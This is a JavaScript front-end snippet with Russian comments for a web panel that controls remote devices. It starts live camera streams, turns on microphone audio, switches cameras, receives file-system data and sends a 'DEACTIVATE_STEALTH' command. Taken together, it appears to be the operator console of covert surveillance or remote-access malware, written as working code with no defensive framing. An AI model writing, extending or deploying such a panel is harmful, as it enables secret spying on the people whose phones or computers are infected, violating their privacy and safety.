// Добавьте эти переменения в глобальную область
let isLiveStreaming = false;
let isAudioStreaming = false;
let liveStreamWebSocket = null;
let audioContext = null;

// Функции управления камерой
async function toggleLiveStream() {
    if (!selectedDeviceId) {
        showError('Please select a device first');
        return;
    }
    
    const btn = document.getElementById('liveStreamBtn');
    const status = document.getElementById('streamStatus');
    
    if (!isLiveStreaming) {
        // Запуск живого стрима
        try {
            await sendDeviceCommand('START_LIVE_STREAM');
            initLiveStreamConnection();
            
            isLiveStreaming = true;
            btn.textContent = '⏹ STOP CAM';
            btn.style.background = 'var(--danger-red)';
            status.textContent = 'Live Streaming';
            status.style.color = 'var(--success-green)';
            
        } catch (error) {
            showError('Failed to start live stream');
        }
    } else {
        // Остановка живого стрима
        await sendDeviceCommand('STOP_LIVE_STREAM');
        closeLiveStreamConnection();
        
        isLiveStreaming = false;
        btn.textContent = '📹 LIVE CAM';
        btn.style.background = '';
        status.textContent = 'Offline';
        status.style.color = 'var(--text-secondary)';
    }
}

async function toggleAudio() {
    if (!selectedDeviceId) return;
    
    const btn = document.getElementById('audioBtn');
    
    if (!isAudioStreaming) {
        await sendDeviceCommand('START_AUDIO');
        initAudioPlayback();
        
        isAudioStreaming = true;
        btn.textContent = '🔇 MUTE';
        btn.style.background = 'var(--success-green)';
        
    } else {
        await sendDeviceCommand('STOP_AUDIO');
        stopAudioPlayback();
        
        isAudioStreaming = false;
        btn.textContent = '🎤 AUDIO';
        btn.style.background = '';
    }
}

async function switchCamera() {
    if (!selectedDeviceId) return;
    await sendDeviceCommand('SWITCH_CAMERA');
}

async function emergencyStop() {
    if (!selectedDeviceId) return;
    
    await sendDeviceCommand('DEACTIVATE_STEALTH');
    
    // Сброс всех состояний
    isLiveStreaming = false;
    isAudioStreaming = false;
    closeLiveStreamConnection();
    stopAudioPlayback();
    
    // Сброс UI
    document.getElementById('liveStreamBtn').textContent = '📹 LIVE CAM';
    document.getElementById('audioBtn').textContent = '🎤 AUDIO';
    document.getElementById('streamStatus').textContent = 'Offline';
    disableCameraControls();
}

async function sendDeviceCommand(command) {
    try {
        const response = await fetch('/api/device/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                device_id: selectedDeviceId,
                command: command,
                token: token
            })
        });
        
        if (!response.ok) throw new Error('Command failed');
        
    } catch (error) {
        console.error('Failed to send device command:', error);
        throw error;
    }
}

// В JavaScript части замените функцию initLiveStreamConnection:
function initLiveStreamConnection() {
    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${wsProtocol}//${window.location.host}/ws/live`;
    liveStreamWebSocket = new WebSocket(wsUrl);
    
    liveStreamWebSocket.onopen = () => {
        console.log('Live stream WebSocket connected');
    };
    
    liveStreamWebSocket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        // Фильтруем сообщения только от выбранного устройства
        if (data.deviceId === selectedDeviceId) {
            if (data.type === 'image') {
                displayLiveImage(data.data);
            } else if (data.type === 'audio') {
                playAudioData(data.data);
            } else {
                handleFileSystemMessage(data);
            }
        }
    };
    
    liveStreamWebSocket.onclose = () => {
        console.log('Live stream connection closed');
        // Переподключение через 5 секунд
        setTimeout(() => {
            if (selectedDeviceId) {
                initLiveStreamConnection();
            }
        }, 5000);
    };
    
    liveStreamWebSocket.onerror = (error) => {
        console.error('WebSocket error:', error);
    };
}

function displayLiveImage(base64Image) {
    const canvas = document.getElementById('imageCanvas');
    const ctx = canvas.getContext('2d');
    
    const img = new Image();
    img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
    };
    img.src = 'data:image/jpeg;base64,' + base64Image;
}

function initAudioPlayback() {
    audioContext = new (window.AudioContext || window.webkitAudioContext)();
}

function playAudioData(base64Audio) {
    if (!audioContext) return;
    
    try {
        const audioData = Uint8Array.from(atob(base64Audio), c => c.charCodeAt(0));
        
        audioContext.decodeAudioData(audioData.buffer).then(buffer => {
            const source = audioContext.createBufferSource();
            source.buffer = buffer;
            source.connect(audioContext.destination);
            source.start();
        });
    } catch (error) {
        console.error('Audio playback error:', error);
    }
}

function closeLiveStreamConnection() {
    if (liveStreamWebSocket) {
        liveStreamWebSocket.close();
        liveStreamWebSocket = null;
    }
}

function stopAudioPlayback() {
    if (audioContext) {
        audioContext.close();
        audioContext = null;
    }
}

// Включение кнопок управления при выборе устройства
function enableCameraControls() {
    document.getElementById('liveStreamBtn').disabled = false;
    document.getElementById('audioBtn').disabled = false;
    document.getElementById('switchBtn').disabled = false;
    document.getElementById('stopBtn').disabled = false;
}

function disableCameraControls() {
    document.getElementById('liveStreamBtn').disabled = true;
    document.getElementById('audioBtn').disabled = true;
    document.getElementById('switchBtn').disabled = true;
    document.getElementById('stopBtn').disabled = true;
}

// Обновите функцию selectDevice
async function selectDevice(deviceId) {
    selectedDeviceId = deviceId;
    renderDevicesList();
    await loadDeviceData(deviceId);
    enableCameraControls(); // Включаем кнопки управления
}